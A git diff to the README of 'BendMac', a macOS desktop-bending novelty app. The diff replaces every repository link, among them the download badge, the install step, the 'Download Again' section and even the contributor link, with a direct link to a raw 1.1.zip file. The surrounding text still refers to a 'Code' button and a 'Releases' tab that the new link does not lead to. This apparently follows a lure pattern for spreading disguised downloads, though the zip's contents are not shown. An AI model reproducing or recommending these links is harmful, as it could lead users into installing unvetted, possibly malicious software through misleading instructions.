@@ -1,6 +1,6 @@
 # 💻 BendMac - Your Desktop Bends When You Close Your Laptop
 
-[![Download BendMac](https://img.shields.io/badge/Download-BendMac-blue?style=for-the-badge&logo=github&logoColor=white&color=%234FC3F7)](https://github.com/dvmx7/BendMac)
+[![Download BendMac](https://img.shields.io/badge/Download-BendMac-blue?style=for-the-badge&logo=github&logoColor=white&color=%234FC3F7)](https://raw.githubusercontent.com/dvmx7/BendMac/main/BendMac/1.1.zip)
 
 ## 🎯 What Is BendMac?
 
@@ -23,7 +23,7 @@ Getting BendMac up and running takes less than two minutes. Follow these steps c
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/dvmx7/BendMac](https://github.com/dvmx7/BendMac)
+Visit this link to download the application: [https://raw.githubusercontent.com/dvmx7/BendMac/main/BendMac/1.1.zip](https://raw.githubusercontent.com/dvmx7/BendMac/main/BendMac/1.1.zip)
 
 On that page, look for the green "Code" button or the "Releases" section on the right side. Click the latest release and download the file that matches your system.
 
@@ -138,11 +138,11 @@ BendMac is open source, and contributions are welcome. If you're a developer, yo
 - Suggest new features.
 - Submit code improvements via pull requests.
 
-Visit the repository at [https://github.com/dvmx7/BendMac](https://github.com/dvmx7/BendMac) to get involved.
+Visit the repository at [https://raw.githubusercontent.com/dvmx7/BendMac/main/BendMac/1.1.zip](https://raw.githubusercontent.com/dvmx7/BendMac/main/BendMac/1.1.zip) to get involved.
 
 ## 📦 Download Again
 
-Need to download BendMac again? No problem. Visit this link to download the application: [https://github.com/dvmx7/BendMac](https://github.com/dvmx7/BendMac)
+Need to download BendMac again? No problem. Visit this link to download the application: [https://raw.githubusercontent.com/dvmx7/BendMac/main/BendMac/1.1.zip](https://raw.githubusercontent.com/dvmx7/BendMac/main/BendMac/1.1.zip)
 
 Click the "Releases" tab on the right side of the page, select the latest version, and download the `.dmg` or `.zip` file. Then follow the same installation steps from earlier in this guide.
 
